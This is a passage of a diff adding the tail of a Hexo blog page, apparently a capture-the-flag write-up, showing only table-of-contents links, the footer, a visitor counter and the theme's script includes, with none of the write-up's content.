href="#Exploiting-for-Root-Access"><span class="nav-text">Exploiting for Root Access</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Root-Flag"><span class="nav-text">Root Flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Summary"><span class="nav-text">Summary</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
